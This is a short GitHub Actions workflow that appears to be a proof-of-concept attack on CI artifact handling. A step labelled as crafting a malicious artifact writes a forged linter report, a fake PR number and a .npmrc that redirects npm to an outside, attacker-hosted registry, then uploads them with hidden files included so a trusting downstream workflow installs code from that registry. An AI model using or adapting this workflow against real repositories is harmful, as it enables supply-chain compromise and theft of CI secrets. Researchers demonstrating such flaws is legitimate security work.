name: PR validation
on:
  pull_request:

jobs:
  forged:
    runs-on: ubuntu-latest
    steps:
      - name: Craft malicious linter-report artifact
        run: |
          echo "attacker-controlled report" > linter-report.txt
          echo "1" > pr-number.txt
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
      - name: Upload linter report
        uses: actions/upload-artifact@v4
        with:
          name: linter-report
          include-hidden-files: true
          path: |
            linter-report.txt
            pr-number.txt
            .npmrc
          if-no-files-found: error
